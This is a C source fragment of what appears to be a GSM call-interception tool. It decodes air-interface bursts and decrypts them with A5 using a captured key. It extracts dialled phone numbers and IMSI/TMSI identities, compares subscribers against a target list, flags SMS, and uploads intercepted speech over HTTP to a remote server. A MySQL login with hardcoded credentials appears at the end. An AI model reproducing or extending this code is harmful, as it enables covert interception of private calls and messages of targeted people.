		jump_to_tch_channel(ms, &app_state.resync_message.chan_desc, app_state.resync_message.ma, app_state.resync_message.ma_len, app_state.resync_message.bcch_arfcn, app_state.resync_message.old_bcch_arfcn, app_state.cell_id, app_state.lac_id, app_state.resync_message.fn);

		/* Clear if new set */
		for (i = 0; i < 8; i++) {
				memset(app_state.mI_ul[i], 0x00, 114);
				memset(app_state.mI_dl[i], 0x00, 114);
		}

	}

	if (app_state.is_call_release == 1) { /* Released channel */
		ccch_quit = 1;
		/* Send http_data */
		LOGP(DRR, LOGL_NOTICE, "The Dedicate Channel is released ! \n");
		app_state.http_data.arfcn = app_state.arfcn;
		app_state.http_data.cell_id = app_state.cell_id;
		app_state.http_data.lac = app_state.lac_id;
		app_state.http_data.type = GSM_TYPE_SPEECH;
		os_http_clear_buffer(app_state.http_data.speech.remote_addr);
		evbuffer_add_printf(app_state.http_data.speech.remote_addr, "%s", app_state.phonenumber);
		os_http_clear_buffer(app_state.http_data.speech.local_addr);
		evbuffer_add_printf(app_state.http_data.speech.local_addr, "%s", app_state.local_addr_str);
		app_state.http_data.speech.dch_ciph = app_state.dch_ciph;
		app_state.http_data.cell_id = app_state.cell_id;
		app_state.http_data.lac = app_state.lac_id;
		app_state.http_data.speech.speed_mode = app_state.speed_mode;
		app_state.http_data.speech.is_end_part = 1;

		for (i = 0; i < sys.workers[sys.id].http_retries; i++) {
			if (os_http_client_sendreq(&app_state.http_data) == 0) {
				os_http_clear_buffer(app_state.http_data.speech.speech_data);
				app_state.http_data.speech.last_send_time = time(NULL);
				app_state.http_data.speech.current_part++;
				break;
			}
		}
	}
}

static void process_facch_tch(struct osmocom_ms *ms, struct l1ctl_burst_ind *bi) {
	int16_t rx_dbm;
	uint16_t arfcn;
	uint32_t fn;
	int ul, bid, i, k, length;
	uint8_t cbits;
	sbit_t (*bursts)[116];
	sbit_t mC[456], iB[912];
	ubit_t bt[116];
	uint8_t l2_data[23];

	arfcn = ntohs(bi->band_arfcn);
	rx_dbm = rxlev2dbm(bi->rx_level);
	fn = ntohl(bi->frame_nr);
	ul = !!(arfcn & ARFCN_UPLINK);
	bursts = ul ? app_state.mI_ul : app_state.mI_dl;
	cbits = bi->chan_nr >> 3;

	if (fn % 13 == 12)
		return -1;
	bid = ((fn % 13) % 4);
	osmo_pbit2ubit_ext(bt, 0, bi->bits, 0, 57, 0);
	osmo_pbit2ubit_ext(bt, 59, bi->bits, 57, 57, 0);

	/* A5/x */
	if (app_state.dch_ciph) {
		ubit_t ks_dl[114], ks_ul[114], *ks = ul ? ks_ul : ks_dl;
		osmo_a5(app_state.dch_ciph, app_state.kc, fn, ks_dl, ks_ul);
		for (i = 0; i < 57; i++)
			bt[i] ^= ks[i];
		for (i = 59; i < 116; i++)
			bt[i] ^= ks[i - 2];
	}

	for (i = 0; i < 116; i++) {
		bursts[bid + 4][i] = bt[i] ? -(bi->snr >> 1) : (bi->snr >> 1);
	}

	if (bid % 4 == 3) {
		sbit_t temp_block_buffer[8 * 116] = { 0 };
		memset(temp_block_buffer, 0, 8 * 116);
		memcpy(temp_block_buffer, bursts, 8 * 116);
		for (i = 0; i < 4; i++) {
			memcpy(bursts[i], bursts[i + 4], sizeof(sbit_t) * 116);
			memset(bursts[i + 4], 0, sizeof(sbit_t) * 116);
		}
		for (i = 0; i < 8; i++) {
			gsm0503_tch_burst_unmap(&iB[i * 114], &temp_block_buffer[i * 116], NULL, i >> 2);
		}
		gsm0503_tch_fr_deinterleave(mC, iB);
		if (facch_conv_decode(l2_data, mC) >= 0) {
			uint8_t chan_type, chan_ts, chan_ss;
			uint8_t gsmtap_chan_type;

			/* Send to GSMTAP */
			rsl_dec_chan_nr(bi->chan_nr, &chan_type, &chan_ss, &chan_ts);
			gsmtap_chan_type = chantype_rsl2gsmtap(chan_type,
					bi->flags & BI_FLG_SACCH ? 0x40 : 0x00);
			gsmtap_send(gsmtap_inst, arfcn, chan_ts, gsmtap_chan_type, chan_ss,
					ntohl(bi->frame_nr), bi->rx_level - 110, bi->snr, l2_data,
					sizeof(l2_data));
			process_facch_message(ms, l2_data, ul, fn);
		}
	}
}

static void process_facch_tch_hr(struct osmocom_ms *ms, struct l1ctl_burst_ind *bi) {
	int16_t rx_dbm;
	uint16_t arfcn;
	uint32_t fn;
	uint8_t cbits, tn;
	int ul, fn_is_odd, bid, i;
	sbit_t iB[912], mC[456];
	sbit_t (*bursts)[116];
	ubit_t bt[116];
	uint8_t l2_data[23];

	arfcn = ntohs(bi->band_arfcn);
	rx_dbm = rxlev2dbm(bi->rx_level);
	fn = ntohl(bi->frame_nr);
	ul = !!(arfcn & ARFCN_UPLINK);
	bursts = ul ? app_state.mI_ul : app_state.mI_dl;
	cbits = bi->chan_nr >> 3;
	tn = bi->chan_nr & 7;

	if (fn % 13 == 12)
		return -1;

	bid = (((fn % 13) / 2) % 2);
	fn_is_odd = (((fn + 26 - 10) % 26) >> 2) & 1;

	/* Unpack (ignore hu/hl) */
	osmo_pbit2ubit_ext(bt, 0, bi->bits, 0, 57, 0);
	osmo_pbit2ubit_ext(bt, 59, bi->bits, 57, 57, 0);

	/* A5/x */
	if (app_state.dch_ciph) {
		ubit_t ks_dl[114], ks_ul[114], *ks = ul ? ks_ul : ks_dl;
		osmo_a5(app_state.dch_ciph, app_state.kc, fn, ks_dl, ks_ul);
		for (i = 0; i < 57; i++)
			bt[i] ^= ks[i];
		for (i = 59; i < 116; i++)
			bt[i] ^= ks[i - 2];
	}

	for (i = 0; i < 116; i++) {
		bursts[4 + bid][i] = bt[i] ? -(bi->snr >> 1) : (bi->snr >> 1);
	}

	if (bid == 1) {
		sbit_t temp_block_buffer[6 * 116] = { 0 };
		memset(temp_block_buffer, 0, 6 * 116);
		memcpy(temp_block_buffer, bursts, 6 * 116);
		for (i = 0; i < 4; i++) {
			memcpy(bursts[i], bursts[i + 2], sizeof(sbit_t) * 116);
			memset(bursts[i + 2], 0, sizeof(sbit_t) * 116);
		}
		for (i = 0; i < 6; i++) {
			gsm0503_tch_burst_unmap(&iB[i * 114], &temp_block_buffer[i * 116], NULL, i >> 2);
		}
		for (i = 2; i < 4; i++) {
			gsm0503_tch_burst_unmap(&iB[i * 114 + 456], &temp_block_buffer[i * 116], NULL, 1);
		}
		gsm0503_tch_fr_deinterleave(mC, iB);

		if (facch_conv_decode(l2_data, mC) >= 0) {
			uint8_t chan_type, chan_ts, chan_ss;
			uint8_t gsmtap_chan_type;

			process_facch_message(ms, l2_data, ul, fn);

			/* Send to GSMTAP */
			rsl_dec_chan_nr(bi->chan_nr, &chan_type, &chan_ss, &chan_ts);
			gsmtap_chan_type = chantype_rsl2gsmtap(chan_type, bi->flags & BI_FLG_SACCH ? 0x40 : 0x00);
			gsmtap_send(gsmtap_inst, arfcn, chan_ts, gsmtap_chan_type, chan_ss,
					ntohl(bi->frame_nr), bi->rx_level - 110, bi->snr, l2_data,
					sizeof(l2_data));
		}
	}
}

static void create_id(struct osmocom_ms *ms, struct l1ctl_burst_ind *bi) {
	time_t d;
	struct tm *lt;

	time(&d);
	lt = gmtime(&d);

	snprintf(app_state.http_data.id, 150,
			"%04d%02d%02d_%02d%02d%02d_%d_%d_%02x_%02x", lt->tm_year + 1900,
			lt->tm_mon + 1, lt->tm_mday, lt->tm_hour, lt->tm_min, lt->tm_sec,
			ms->test_arfcn, ntohl(bi->frame_nr), bi->chan_nr, sys.id);
	LOGP(DCC, LOGL_NOTICE, "Session id: %s\n", app_state.http_data.id);
}

static void local_burst_decode(struct osmocom_ms *ms, struct l1ctl_burst_ind *bi) {
	int16_t rx_dbm;
	uint16_t arfcn;
	uint32_t fn;
	uint8_t cbits, tn, lch_idx;
	int ul, bid, i;
	sbit_t *bursts;
	ubit_t bt[116];
	char tempbuf[200] = "";
	char filebuf[2000] = "";
	int mIdx, v;
	uint8_t RRlayer2[23];
	uint8_t NR = 0;

	arfcn = ntohs(bi->band_arfcn);
	rx_dbm = rxlev2dbm(bi->rx_level);

	fn = ntohl(bi->frame_nr);
	ul = !!(arfcn & ARFCN_UPLINK);
	bursts = ul ? app_state.bursts_ul_cipherbuffer : app_state.bursts_dl_cipherbuffer;
	cbits = bi->chan_nr >> 3;
	tn = bi->chan_nr & 7;

	bid = -1;
	app_state.last_fn = fn;

	if (cbits == 0x01) { /* TCH/F */
		/* Is gen http_data.id ? */
		if (strlen(app_state.http_data.id) == 0) {
			create_id(ms, bi);
		}
		if (bi->flags & BI_FLG_SACCH) {
			uint32_t fn_report;
			fn_report = (fn - (tn * 13) + 104) % 104;
			bid = (fn_report - 12) / 26;
			if (bid > 3)
				bid = -1;
			// if (bid == 3)
				LOGP(DCC, LOGL_NOTICE, "TCH/F SACCH %s-- phone_num: %s, arfcn = %d, fn = %d, bid = %u, bi->snr =  %d\n",
									ul ? "uplink --------": "downlink ", app_state.phonenumber, app_state.arfcn, fn, bid, bi->snr);
		} else {
			/* Check facch */
			process_facch_tch(ms, bi);
			evbuffer_add(app_state.http_data.speech.speech_data, bi, sizeof(struct l1ctl_burst_ind));
			if ((int) evbuffer_get_length(app_state.http_data.speech.speech_data) > 0x30000){ /* 20s send speech data */
				app_state.http_data.arfcn = app_state.arfcn;
				app_state.http_data.cell_id = app_state.cell_id;
				app_state.http_data.lac = app_state.lac_id;
				app_state.http_data.type = GSM_TYPE_SPEECH;
				os_http_clear_buffer(app_state.http_data.speech.remote_addr);
				evbuffer_add_printf(app_state.http_data.speech.remote_addr, "%s", app_state.phonenumber);
				os_http_clear_buffer(app_state.http_data.speech.local_addr);
				evbuffer_add_printf(app_state.http_data.speech.local_addr, "%s", app_state.local_addr_str);
				app_state.http_data.speech.dch_ciph = app_state.dch_ciph;
				app_state.http_data.cell_id = app_state.cell_id;
				app_state.http_data.lac = app_state.lac_id;
				app_state.http_data.speech.speed_mode = app_state.speed_mode;
				LOGP(DCC, LOGL_NOTICE, "Speed mode: %s\n", (app_state.speed_mode == GSM48_CMODE_SPEECH_EFR) ?
								"EFR" :
								((app_state.speed_mode == GSM48_CMODE_SPEECH_AMR) ?
										"AMR" : "Unknow ???"));
				LOGP(DCC, LOGL_NOTICE, "Http retries: %u\n", sys.workers[sys.id].http_retries);
				for (i = 0; i < sys.workers[sys.id].http_retries; i++) {
					if (os_http_client_sendreq(&app_state.http_data) == 0) {
						os_http_clear_buffer(app_state.http_data.speech.speech_data);
						app_state.http_data.speech.last_send_time = time(NULL);
						app_state.http_data.speech.current_part++;
						break;
					}
				}
			}
			return;
		}
	} else if ((cbits & 0x1e) == 0x02) { /* TCH/H */
	/* Is gen http_data.id ? */
		if (strlen(app_state.http_data.id) == 0) {
			create_id(ms, bi);
		}
		if (bi->flags & BI_FLG_SACCH) {
			uint32_t fn_report;
			uint8_t tn_report = (tn & ~1) | lch_idx;
			fn_report = (fn - (tn_report * 13) + 104) % 104;
			bid = (fn_report - 12) / 26;
			if (bid > 3)
				bid = -1;
			// if (bid == 3)
				LOGP(DCC, LOGL_NOTICE, "TCH/H SACCH %s -- phone_num: %s, arfcn = %d, fn = %d, bid = %u, bi->snr =  %d\n",
									ul ? "uplink --------": "downlink ", app_state.phonenumber, app_state.arfcn, fn, bid, bi->snr);
		} else {
			/* Check facch */
			process_facch_tch_hr(ms, bi);
			evbuffer_add(app_state.http_data.speech.speech_data, bi, sizeof(struct l1ctl_burst_ind));
			if ((int) evbuffer_get_length(app_state.http_data.speech.speech_data) > 0x30000){ /* 20s send speech data */
				app_state.http_data.arfcn = app_state.arfcn;
				app_state.http_data.cell_id = app_state.cell_id;
				app_state.http_data.lac = app_state.lac_id;
				app_state.http_data.type = GSM_TYPE_SPEECH;
				os_http_clear_buffer(app_state.http_data.speech.remote_addr);
				evbuffer_add_printf(app_state.http_data.speech.remote_addr, "%s", app_state.phonenumber);
				os_http_clear_buffer(app_state.http_data.speech.local_addr);
				evbuffer_add_printf(app_state.http_data.speech.local_addr, "%s", app_state.local_addr_str);
				app_state.http_data.speech.dch_ciph = app_state.dch_ciph;
				app_state.http_data.cell_id = app_state.cell_id;
				app_state.http_data.lac = app_state.lac_id;
				app_state.http_data.speech.speed_mode = app_state.speed_mode;

				for (i = 0; i < sys.workers[sys.id].http_retries; i++) {
					if (os_http_client_sendreq(&app_state.http_data) == 0) {
						os_http_clear_buffer(app_state.http_data.speech.speech_data);
						app_state.http_data.speech.last_send_time = time(NULL);
						app_state.http_data.speech.current_part++;
						break;
					}
				}
			}
			return;
		}
	} else if ((cbits & 0x1c) == 0x04) { /* SDCCH/4 */
		lch_idx = cbits & 3;
		bid = bi->flags & 3;
		LOGP(DRR, LOGL_NOTICE, " SDCCH/4\n");
	} else if ((cbits & 0x18) == 0x08) { /* SDCCH/8 */
		lch_idx = cbits & 7;
		bid = bi->flags & 3;
	}

	if (bid == -1)
		return;

	/* Clear if new set */
	if (bid == 0)
		memset(bursts, 0x00, 116 * 4);

	osmo_pbit2ubit_ext(bt, 0, bi->bits, 0, 57, 0);
	osmo_pbit2ubit_ext(bt, 59, bi->bits, 57, 57, 0);
	bt[57] = bt[58] = 1;

	/* A5/x */
	if (app_state.has_cipher_cmd == 0 || app_state.dch_ciph == 0) {
		ubit_t ks_dl[114], ks_ul[114], *ks = ul ? ks_ul : ks_dl;
		uint8_t kc[8];
		osmo_a5(0, kc, fn, ks_dl, ks_ul);
		for (i = 0; i < 57; i++)
			bt[i] ^= ks[i];
		for (i = 59; i < 116; i++)
			bt[i] ^= ks[i - 2];
	} else {
		// LOGP(DCC, LOGL_NOTICE, "Decode cipher\n");
		ubit_t ks_dl[114], ks_ul[114], *ks = ul ? ks_ul : ks_dl;
		osmo_a5(1, app_state.kc, fn, ks_dl, ks_ul);
		for (i = 0; i < 57; i++)
			bt[i] ^= ks[i];
		for (i = 59; i < 116; i++)
			bt[i] ^= ks[i - 2];
	}

	/* Convert to softbits */
	for (i = 0; i < 116; i++)
		bursts[(116 * bid) + i] = bt[i] ? -(bi->snr >> 1) : (bi->snr >> 1);

	if (bid == 3) {
		uint8_t l2[23];
		int rv, i;
		struct gsm48_ass_cmd *ac;
		uint8_t ch_type, ch_subch, ch_ts;

		rv = xcch_decode(l2, bursts);
		if (rv == 0) {
			uint8_t chan_type, chan_ts, chan_ss;
			uint8_t gsmtap_chan_type;
			int rc;
			int index;
			char _buff[300];

			/* Reset dch_badcnt if decode SACCH sucsessfully*/
			if (bi->flags & BI_FLG_SACCH)
				app_state.dch_badcnt = 0;

			rsl_dec_chan_nr(bi->chan_nr, &chan_type, &chan_ss, &chan_ts);
			gsmtap_chan_type = chantype_rsl2gsmtap(chan_type,
					bi->flags & BI_FLG_SACCH ? 0x40 : 0x00);
			rc = gsmtap_send(gsmtap_inst, arfcn, chan_ts, gsmtap_chan_type, chan_ss,
					ntohl(bi->frame_nr), bi->rx_level - 110, bi->snr, l2,
					sizeof(l2));
			
			memset(_buff, 0, 300);
			for (index = 0; index < 23; index++) {
				char mbuff[10];
				memset(mbuff, 0, 10);
				snprintf(mbuff, 10, "%02x \0", l2[index]);
				strcat(_buff, mbuff);
			}
			if (app_state.has_jump_channel == 0)
				LOGP(DCC, LOGL_NOTICE, "%s %s\n ", "Cache message: ", _buff);
			else
				LOGP(DCC, LOGL_NOTICE, "%s %s\n ", "SACCH: ", _buff);

			/* Concat CC setup */
			if ((app_state.CCSetup_NR == (l2[1] >> 5)) && (app_state.CCSetup_NS < ((l2[1] >> 1) & 0x07)) && app_state.CCSetup_readyState == 1) {
				app_state.CCSetup_NS = ((l2[1] >> 1) & 0x07);
				if ((l2[2] >> 1) & 0x01) {
					/* Moresegment */
					memcpy(&(app_state.CCSetupBuffer[app_state.CCSetup_Index]), &(l2[3]), 20);
					app_state.CCSetup_readyState = 1;
					app_state.CCSetup_Index += 20;
				} else {
					/* Last segment */
					memcpy(&(app_state.CCSetupBuffer[app_state.CCSetup_Index]), &(l2[3]), (l2[2] >> 2) & 0x3F);
					app_state.CCSetup_readyState = 2;
					app_state.CCSetup_Index += (l2[2] >> 2) & 0x3F;
				}
			}

			if ((app_state.CCSetup_readyState == 0) && ((l2[0] == 0x01) || (l2[0] == 0x03)) && ((l2[3] & 0x0F) == 0x03) && ((l2[4] & 0x3F) == 0x05)) {
				app_state.CCSetup_NR = l2[1] >> 5;
				app_state.CCSetup_NS = ((l2[1] >> 1) & 0x07);
				memset(app_state.CCSetupBuffer, 0, sizeof(app_state.CCSetupBuffer));
				if ((l2[2] >> 1) & 0x01) {
					/* Moresegment */
					app_state.CCSetup_Index += (l2[2] >> 2) & 0x3F;
					memcpy(app_state.CCSetupBuffer, &(l2[3]), 20);
					app_state.CCSetup_readyState = 1;
				} else {
					/* Last,segment */
					memcpy(app_state.CCSetupBuffer, &(l2[3]), (l2[2] >> 2) & 0x3F);
					app_state.CCSetup_readyState = 2;
					app_state.CCSetup_Index += (l2[2] >> 2) & 0x3F;
				}

			}

			/* Handle CC setup */
			if (app_state.CCSetup_readyState == 2) {
				/* Lay so dien thoai chieu mo */
				gsm48_cc_rx_setup_parser(app_state.CCSetupBuffer, app_state.CCSetup_Index, app_state.phonenumber, sizeof(app_state.phonenumber));
				app_state.CCSetup_readyState = 3;
				app_state.CCSetup_Index = 0;
				app_state.CCSetup_NR = 0;
				LOGP(DCC, LOGL_NOTICE, " phone len = %d, phonenumber = %s \n", strlen(app_state.phonenumber), app_state.phonenumber);
			}

			/* Concat Handover */
			if ((app_state.Handover_NR == (l2[1] >> 5))
					&& (app_state.Handover_NS < ((l2[1] >> 1) & 0x07))
					&& app_state.Handover_readyState == 1) {
				// update NS
				app_state.Handover_NS = ((l2[1] >> 1) & 0x07);
				// lay data
				if ((l2[2] >> 1) & 0x01) {
					/* Moresegment */
					memcpy(&(app_state.HandoverBuffer[app_state.Handover_Index]), &(l2[3]), (l2[2] >> 2) & 0x3F);
					app_state.Handover_readyState = 1;
					app_state.Handover_Index += (l2[2] >> 2) & 0x3F;

				} else {
					/* last,segment */
					memcpy(&(app_state.HandoverBuffer[app_state.Handover_Index]), &(l2[3]), (l2[2] >> 2) & 0x3F);
					app_state.Handover_readyState = 2;
					app_state.HandoverFn = fn;
					app_state.Handover_Index += (l2[2] >> 2) & 0x3F;
				}
			}

			/* Process Handover */
			if ((app_state.Handover_readyState == 0) && ((l2[0] == 0x03))
					&& ((l2[3] & 0x0F) == 0x06) && (l2[4] == 0x2b)) {
				app_state.Handover_NR = l2[1] >> 5;
				app_state.Handover_NS = ((l2[1] >> 1) & 0x07);
				memset(app_state.HandoverBuffer, 0,
						sizeof(app_state.HandoverBuffer));
				if ((l2[2] >> 1) & 0x01) {
					/* Moresegment */
					app_state.Handover_Index += (l2[2] >> 2) & 0x3F;
					memcpy(app_state.HandoverBuffer, &(l2[3]), (l2[2] >> 2) & 0x3F);
					app_state.Handover_readyState = 1;

				} else {
					/* Last segment */
					memcpy(app_state.HandoverBuffer, &(l2[3]), (l2[2] >> 2) & 0x3F);
					app_state.Handover_readyState = 2;
					app_state.HandoverFn = fn;
					app_state.Handover_Index += (l2[2] >> 2) & 0x3F;
				}
			}

			/* Concat Assignment cmd */
			if ((ul == 0) && (app_state.AssignCMD_readyState == 1)
					&& (app_state.AssignCMD_NS < ((l2[1] >> 1) & 0x07))
					&& (app_state.AssignCMD_NR == (l2[1] >> 5))) {
				// update NS
				app_state.AssignCMD_NS = ((l2[1] >> 1) & 0x07);
				// lay data
				if ((l2[2] >> 1) & 0x01) {
					/* Moresegment */
					memcpy(&(app_state.AssignCMDBuffer[app_state.AssignCMDBufIndex]), &(l2[3]), 20);
					app_state.AssignCMD_readyState = 1;
					app_state.AssignCMDBufIndex += 20;
				} else {
					/* Last segment */
					memcpy(&(app_state.AssignCMDBuffer[app_state.AssignCMDBufIndex]), &(l2[3]), (l2[2] >> 2) & 0x3F);
					app_state.AssignCMD_readyState = 2;
					app_state.AssignFn = fn;
					app_state.AssignCMDBufIndex += (l2[2] >> 2) & 0x3F;
				}
			}
			
			/* Handle Assignment cmd */
			if ((l2[0] == 0x03) && ((l2[3] & 0x0f) == 0x06) && (l2[4] == 0x2e) && (ul == 0) && (app_state.rxAssignCMD_cnt == 0) && (app_state.AssignCMD_readyState == 0)) {
				app_state.rxAssignCMD_cnt++;
				app_state.AssignCMD_NR = l2[1] >> 5;
				app_state.AssignCMD_NS = ((l2[1] >> 1) & 0x07);
				memset(app_state.AssignCMDBuffer, 0, sizeof(app_state.AssignCMDBuffer));
				if ((l2[2] >> 1) & 0x01) {
					/* Moresegment */
					app_state.AssignCMDBufIndex = 20;
					memcpy(app_state.AssignCMDBuffer, &(l2[3]), 20);
					app_state.AssignCMD_readyState = 1;
				} else {
					/* Last segment */
					memcpy(app_state.AssignCMDBuffer, &(l2[3]), (l2[2] >> 2) & 0x3F);
					app_state.AssignCMD_readyState = 2;
					app_state.AssignFn = fn;
					app_state.AssignCMDBufIndex += (l2[2] >> 2) & 0x3F;
				}

			}

			/* Handle CMservice request */
			if (((l2[3] & 0x0F) == 0x05) && (l2[4] == 0x24)) {
				IMSI_TMSI l_imsi_tmsi;
				memset(&l_imsi_tmsi, 0, sizeof(IMSI_TMSI));

				if ((l2[11] & 0x0f) == 0x04) {
					l_imsi_tmsi.length = l2[10] - 1;
					memcpy(l_imsi_tmsi.data, &l2[12], l_imsi_tmsi.length);
				} else if ((l2[11] & 0x0f) == 0x09) {
					l_imsi_tmsi.length = l2[10];
					memcpy(l_imsi_tmsi.data, &l2[11], l_imsi_tmsi.length);
					l_imsi_tmsi.data[0] = l_imsi_tmsi.data[0] & 0xF0;
				} else {
					l_imsi_tmsi.length = 0;
				}

				memcpy(&app_state.local_addr, &l_imsi_tmsi, sizeof(IMSI_TMSI));
				BinToHex(app_state.local_addr.data, app_state.local_addr.length, app_state.local_addr_str, sizeof(app_state.local_addr_str));
				LOGP(DRR, LOGL_NOTICE, "CMservice request -- TMSI: %s\n", app_state.local_addr_str);

				app_state.has_CMrequest_pagingrespone = 1;
				char val[4] = { 0 };
				for (mIdx = 0; mIdx < d_target; mIdx++) {
					char* pos = d_target_list[mIdx];
					for (int count = 0; count < 4; count++) {
						char buf[10];
						sprintf(buf, "0x%c%c", pos[0], pos[1]);
						val[count] = strtol(buf, NULL, 0);
						pos += 2 * sizeof(char);
					}
					if (memcmp(app_state.local_addr.data, val, 4 * sizeof(char)) == 0) {
						app_state.match_imsi_tmsi = 1;
						break;
					}
				}
				if (d_target == 0) {
					app_state.match_imsi_tmsi = 1;
				}

				if (app_state.match_imsi_tmsi == 1) {
					LOGP(DRR, LOGL_NOTICE, "Match tmsi, continue following\n");
				}
				else{
					LOGP(DRR, LOGL_NOTICE, "Not match tmsi, stop following\n");
					ccch_quit = 2;
				}

				/* Check SMS */
				if ((l2[5] & 0x0F) == 0x04) {
					LOGP(DRR, LOGL_NOTICE, "CMservice request type SMS\n");
					app_state.http_data.type = GSM_TYPE_SMS;
				} 
			}

			/* Paging response */
			if (((l2[3] & 0x0F) == 0x06) && (l2[4] == 0x27)) {
				IMSI_TMSI l_imsi_tmsi;
				memset(&l_imsi_tmsi, 0, sizeof(IMSI_TMSI));

				if ((l2[11] & 0x0f) == 0x04) {
					l_imsi_tmsi.length = l2[10] - 1;
					memcpy(l_imsi_tmsi.data, &l2[12], l_imsi_tmsi.length);
				} else if ((l2[11] & 0x0f) == 0x09) {
					l_imsi_tmsi.length = l2[10];
					memcpy(l_imsi_tmsi.data, &l2[11], l_imsi_tmsi.length);
					l_imsi_tmsi.data[0] = l_imsi_tmsi.data[0] & 0xF0;
				} else {
					l_imsi_tmsi.length = 0;
				}

				memcpy(&app_state.local_addr, &l_imsi_tmsi, sizeof(IMSI_TMSI));
				BinToHex(app_state.local_addr.data, app_state.local_addr.length, app_state.local_addr_str, sizeof(app_state.local_addr_str));
				LOGP(DRR, LOGL_NOTICE, "Paging response -- TMSI: %s\n", app_state.local_addr_str);

				app_state.has_CMrequest_pagingrespone = 1;
				char val[4] = { 0 };
				for (mIdx = 0; mIdx < d_target; mIdx++) {
					char* pos = d_target_list[mIdx];
					for (int count = 0; count < 4; count++) {
						char buf[10];
						sprintf(buf, "0x%c%c", pos[0], pos[1]);
						val[count] = strtol(buf, NULL, 0);
						pos += 2 * sizeof(char);
					}
					if (memcmp(app_state.local_addr.data, val, 4 * sizeof(char)) == 0) {
						app_state.match_imsi_tmsi = 1;
						break;
					}
				}
				if (d_target == 0) {
					app_state.match_imsi_tmsi = 1;
				}

				if (app_state.match_imsi_tmsi == 1) {
					LOGP(DRR, LOGL_NOTICE, "Match tmsi, continue following\n", app_state.dch_badcnt);
				}
				else{
					LOGP(DRR, LOGL_NOTICE, "Not match tmsi, stop following\n", app_state.dch_badcnt);
					ccch_quit = 2;
				}
			}

			if (app_state.has_CMrequest_pagingrespone == 1){ 
				/* Handle Si6 */
				if ((ul == 0) && (l2[2] == 0x03) && (l2[3] == 0x03) && (l2[5] == 0x06) && (l2[6] == 0x1e)) {
					memcpy(app_state.SI6, l2, 23);
					memset(tempbuf, 0, sizeof(tempbuf));
					memset(filebuf, 0, sizeof(filebuf));

					snprintf(tempbuf, 200, "SI6power0, fn(bid3)= %d, data=", 0);
					strcat(filebuf, tempbuf);
					for (v = 0; v < 23; v++) {
						snprintf(tempbuf, 200, "%02x", app_state.SI6[v]);
						strcat(filebuf, tempbuf);
					}
					strcat(filebuf, "\n");

					os_http_clear_buffer(app_state.http_data.si6);
					evbuffer_add_printf(app_state.http_data.si6, "%s", filebuf);
					evbuffer_add_printf(app_state.http_data.plaintext, "%s", filebuf);

					app_state.has_si6 = 1;
				}

				/* Handle Si5ter */
				if ((ul == 0) && (l2[2] == 0x03) && (l2[3] == 0x03) && (l2[5] == 0x06) && ((l2[6] == 0x06) || (l2[6] == 0x05))) {
					memcpy(app_state.SI5ter, l2, 23);
					memset(tempbuf, 0, sizeof(tempbuf));
					memset(filebuf, 0, sizeof(filebuf));

					snprintf(tempbuf, 200, "SI5terpower0, fn(bid3)= %d, data=", 0);
					strcat(filebuf, tempbuf);
					for (v = 0; v < 23; v++) {
						snprintf(tempbuf, 200, "%02x", app_state.SI5ter[v]);
						strcat(filebuf, tempbuf);
					}
					strcat(filebuf, "\n");

					os_http_clear_buffer(app_state.http_data.si5ter);
					evbuffer_add_printf(app_state.http_data.si5ter, "%s", filebuf);
					evbuffer_add_printf(app_state.http_data.plaintext, "%s", filebuf);

					app_state.has_si5ter = 1;
				}

				/* Handle Si5 */
				if ((l2[2] == 0x03) && (l2[3] == 0x03) && (l2[5] == 0x06) && (l2[6] == 0x1d)) {
					/* Add printf http_data.plaintext */
					uint8_t SI5layer2_power0[23];
					uint8_t SI5layer2_power1[23];

					memset(filebuf, 0, 2000);
					memcpy(app_state.SI5, l2, 23);
					memcpy(SI5layer2_power0, l2, 23);
					memcpy(SI5layer2_power1, l2, 23);

					SI5layer2_power1[0] = 0x01;
					snprintf(tempbuf, 200, "SI5power0, fn(bid3)= %d, data=", fn);
					strcat(filebuf, tempbuf);
					for (v = 0; v < 23; v++) {
						snprintf(tempbuf, 200, "%02x", SI5layer2_power0[v]);
						strcat(filebuf, tempbuf);
					}

					snprintf(tempbuf, 200, "\nSI5power1, fn(bid3)= %d, data=", fn);
					strcat(filebuf, tempbuf);
					for (v = 0; v < 23; v++) {
						snprintf(tempbuf, 200, "%02x", SI5layer2_power1[v]);
						strcat(filebuf, tempbuf);
					}
					strcat(filebuf, "\n");
					evbuffer_add_printf(app_state.http_data.plaintext, "%s", filebuf);
					
					/* Add printf http_data.si5 */
					memset(tempbuf, 0, sizeof(tempbuf));
					memset(filebuf, 0, sizeof(filebuf));
					
					snprintf(tempbuf, 200, "SI5power0, fn(bid3)= %d, data=", 0);
					strcat(filebuf, tempbuf);
					for (v = 0; v < 23; v++) {
						snprintf(tempbuf, 200, "%02x", app_state.SI5[v]);
						strcat(filebuf, tempbuf);
					}
					strcat(filebuf, "\n");
					os_http_clear_buffer(app_state.http_data.si5);
					evbuffer_add_printf(app_state.http_data.si5, "%s",filebuf);
					
					app_state.has_si5 = 1;
				}

				/* Handle Ciphering Mode Command */
				if ((l2[3] == 0x06) && (l2[4] == 0x35) && (l2[5] & 1)) {
					app_state.dch_ciph = 1 + ((l2[5] >> 1) & 7);
					LOGP(DRR, LOGL_NOTICE, "Detect Ciphering Mode Command frame number: %d, dch_ciph: %d \n", fn, app_state.dch_ciph);
					app_state.has_cipher_cmd = 1;
					memset(filebuf, 0, 2000);

					NR = ((l2[1] >> 5) & 0x07) + 1;
					RRlayer2[0] = 0x01;
					RRlayer2[1] = 0x01 | (NR << 5);
					RRlayer2[2] = 0x01;
					for (v = 3; v < 23; v++) {
						RRlayer2[v] = 0x2b;
					}

					snprintf(tempbuf, 200, "RR, fn(bid3)= %d, data=", fn);
					strcat(filebuf, tempbuf);
					for (v = 0; v < 23; v++) {
						snprintf(tempbuf, 200, "%02x", RRlayer2[v]);
						strcat(filebuf, tempbuf);
					}
					strcat(filebuf, "\n");
					evbuffer_add_printf(app_state.http_data.plaintext, "%s", filebuf);
				}
			}
		} else {
			if ((bi->flags & BI_FLG_SACCH) && (!ul)) {
					app_state.dch_badcnt += 4;
					LOGP(DCC, LOGL_NOTICE, "SACCH app_state.dch_badcnt++ = %d\n", app_state.dch_badcnt);
			}
		}
	}
}

void finish_with_error(MYSQL *con)
{
	fprintf(stderr, "%s\n", mysql_error(con));
	mysql_close(con);
	exit(1);        
}

static int get_params_from_request_kc(uint32_t id) {
	MYSQL *con = mysql_init(NULL);
	if (con == NULL) {
		fprintf(stderr, "mysql_init() failed\n");
		exit(1);
	}  

	if (mysql_real_connect(con, DATABASE_HOSTNAME, "netsharing", "12345678", "app_state", 0, NULL, 0) == NULL) {
	      finish_with_error(con);
	}

